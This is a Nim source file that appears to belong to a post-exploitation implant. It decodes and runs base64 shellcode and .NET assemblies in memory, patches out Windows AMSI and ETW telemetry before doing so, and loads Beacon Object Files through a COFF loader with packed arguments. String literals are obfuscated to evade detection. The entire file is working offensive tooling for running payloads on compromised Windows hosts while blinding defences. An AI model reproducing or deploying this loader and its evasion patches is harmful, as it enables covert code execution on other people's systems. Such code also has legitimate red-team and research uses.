from std/base64 import decode
import std/json
from std/strutils import parseHexInt, parseInt, strip, toHex
import std/unicode
import ../../utils/global
import ../../utils/msg
export writeMsg, writeErr, errorText
import ../../utils/coffloader/nimcoff
import ../patch
import ./shellcode as shellcode
import ./dotnet as dotnet

type
  ShellcodeKind* = enum
    skShellcode
    skDotnet

proc decodePayload(input: string): seq[byte] =
  # Decodes a base 64 payload into raw bytes
  if input.len == 0:
    return @[]
  let raw = decode(input)
  result = newSeq[byte](raw.len)
  if raw.len > 0: copyMem(addr result[0], unsafeAddr raw[0], raw.len)

proc utf8ToUtf16Le(s: string): seq[uint16] =
  # Converts a utf 8 string into utf 16 little endian bytes
  result = @[]
  for r in toRunes(s):
    let cp = int(r)
    if cp <= 0xFFFF:
      result.add uint16(cp)
    else:
      let n = cp - 0x10000
      result.add uint16(0xD800'u16 or uint16(n shr 10))
      result.add uint16(0xDC00'u16 or uint16(n and 0x3FF))
  result.add 0

proc packBofArgs(params: string): seq[byte] =
  # Builds the packed argument buffer for a bof
  var data: seq[byte] = @[]
  var tokens: seq[string] = @[]
  var i = 0
  let rawParams = params.strip()

  while i < rawParams.len:
    while i < rawParams.len and rawParams[i] in {' ', '\t', '\r', '\n'}: inc i
    if i >= rawParams.len: break
    var token = ""

    if i + 1 < rawParams.len and rawParams[i + 1] == ':' and rawParams[i] in {'z', 'Z', 'i', 's', 'b'}:
      token.add rawParams[i]; token.add ':'; i += 2
      if i < rawParams.len and rawParams[i] == '"':
        inc i
        while i < rawParams.len and rawParams[i] != '"': token.add rawParams[i]; inc i
        if i < rawParams.len: inc i
      else:
        while i < rawParams.len and rawParams[i] notin {' ', '\t', '\r', '\n'}: token.add rawParams[i]; inc i
    else:
      if i < rawParams.len and rawParams[i] == '"':
        inc i
        while i < rawParams.len and rawParams[i] != '"': token.add rawParams[i]; inc i
        if i < rawParams.len: inc i
      else:
        while i < rawParams.len and rawParams[i] notin {' ', '\t', '\r', '\n'}: token.add rawParams[i]; inc i
    if token.len > 0: tokens.add token

  for token in tokens:
    let hasType = token.len >= 2 and token[1] == ':' and token[0] in {'z', 'Z', 'i', 's', 'b'}
    let typ = if hasType: $token[0] else: ""
    let val = if hasType: token[2 .. ^1] else: token
    case typ
    of obf("z"):
      let s = val & obf("\0")
      let slen = uint32(s.len)
      data.add byte(slen and 0xFF'u32)
      data.add byte((slen shr 8) and 0xFF'u32)
      data.add byte((slen shr 16) and 0xFF'u32)
      data.add byte((slen shr 24) and 0xFF'u32)
      for c in s: data.add byte(c)
    of obf("Z"):
      var wbuf: seq[byte] = @[]
      for ch in utf8ToUtf16Le(val):
        wbuf.add byte(ch and 0xFF'u16)
        wbuf.add byte((ch shr 8) and 0xFF'u16)
      let wlen = uint32(wbuf.len)
      data.add byte(wlen and 0xFF'u32)
      data.add byte((wlen shr 8) and 0xFF'u32)
      data.add byte((wlen shr 16) and 0xFF'u32)
      data.add byte((wlen shr 24) and 0xFF'u32)
      for b in wbuf: data.add b
    of obf("i"):
      let v = uint32(parseInt(val))
      data.add byte(v and 0xFF'u32)
      data.add byte((v shr 8) and 0xFF'u32)
      data.add byte((v shr 16) and 0xFF'u32)
      data.add byte((v shr 24) and 0xFF'u32)
    of obf("s"):
      let v = uint16(parseInt(val))
      data.add byte(v and 0xFF'u16)
      data.add byte((v shr 8) and 0xFF'u16)
    of obf("b"):
      var raw: seq[byte] = @[]
      var j = 0
      while j + 1 < val.len:
        raw.add byte(parseHexInt(val[j .. j + 1]))
        j += 2
      let rlen = uint32(raw.len)
      data.add byte(rlen and 0xFF'u32)
      data.add byte((rlen shr 8) and 0xFF'u32)
      data.add byte((rlen shr 16) and 0xFF'u32)
      data.add byte((rlen shr 24) and 0xFF'u32)
      for b in raw: data.add b
    else:
      let s = val & obf("\0")
      let slen = uint32(s.len)
      data.add byte(slen and 0xFF'u32)
      data.add byte((slen shr 8) and 0xFF'u32)
      data.add byte((slen shr 16) and 0xFF'u32)
      data.add byte((slen shr 24) and 0xFF'u32)
      for c in s: data.add byte(c)

  let dataLen = uint32(data.len)
  result = @[
    byte(dataLen and 0xFF'u32),
    byte((dataLen shr 8) and 0xFF'u32),
    byte((dataLen shr 16) and 0xFF'u32),
    byte((dataLen shr 24) and 0xFF'u32),
  ]
  for b in data: result.add b

proc bofExceptionDesc(code: uint32): string =
  # Returns a short description for a bof exception code
  case code
  of 0xC0000005'u32: obf("Access Violation")
  of 0xC0000094'u32: obf("Integer Divide by Zero")
  of 0xC0000096'u32: obf("Privileged Instruction")
  of 0xC000001D'u32: obf("Illegal Instruction")
  of 0xC00000FD'u32: obf("Stack Overflow")
  of 0xC0000409'u32: obf("Stack Buffer Overrun")
  of 0xC0000374'u32: obf("Heap Corruption")
  of 0xC0000017'u32: obf("No Memory")
  of 0x80000003'u32: obf("Breakpoint")
  of 0x80000004'u32: obf("Single Step")
  of 0xC0000008'u32: obf("Invalid Handle")
  of 0xC000013A'u32: obf("Control-C Exit")
  else: obf("Unknown exception")

proc writeBytes(data: openArray[byte]; buf: var openArray[char]): int =
  # Writes raw bytes into the output buffer
  if data.len > buf.len: return -1
  if data.len > 0: copyMem(addr buf[0], unsafeAddr data[0], data.len)
  data.len

proc run_shellcode*(input, params: string; buf: var openArray[char]; kind: ShellcodeKind): int =
  # Main function that runs shell code or dotnet inline
  let payload = decodePayload(input)
  if payload.len == 0: return writeErr(obf("invalid input"), buf)
  case kind:
  of skDotnet:
    if amsiPatch == obf("on"):
      patch_amsi()
    if etwPatch == obf("on"):
      patch_etw()
    result = dotnet.runDotnetInline(payload, params, buf)
    # check_dynamic_patch()
  of skShellcode:
    result = shellcode.runShellcodeInline(payload, buf)

proc run_bof*(input, params: string; buf: var openArray[char]): int =
  # Main function that loads and runs a bof
  let taskParams = try:
    parseJson(params)
  except JsonParsingError:
    return writeErr(obf("invalid parameters JSON"), buf)

  if not taskParams.hasKey(obf("file")):
    return writeErr(obf("missing 'file' in parameters"), buf)

  let bofBytes = decodePayload(input)
  if bofBytes.len == 0:
    return writeErr(obf("empty or invalid BOF input"), buf)

  var argPtr: pointer = nil
  var argSize: uint32 = 0
  var argsBuf: seq[byte]

  if taskParams.hasKey(obf("args")):
    let rawArgs = taskParams[obf("args")].getStr()
    if rawArgs.len > 0:
      argsBuf = packBofArgs(rawArgs)
      if argsBuf.len > 0:
        argPtr = cast[pointer](addr argsBuf[0])
        argSize = uint32(argsBuf.len)

  let runResult = runCoff(bofBytes, obf("go"), argPtr, argSize)
  let outBytes = bofGetOutputData()

  if outBytes.len > 0:
    return writeBytes(outBytes, buf)

  if not runResult[0]:
    let code = cast[uint32](runResult[1])
    if code >= 0x80000000'u32:
      let desc = bofExceptionDesc(code)
      return writeErr(obf("BOF crashed: ") & desc, buf, code)
    if runResult[2].len > 0:
      return writeErr(obf("BOF loader error: ") & runResult[2], buf)
    return writeErr(obf("BOF loader error (Win32)"), buf, code)

  writeMsg(obf("BOF executed. No output."), buf)
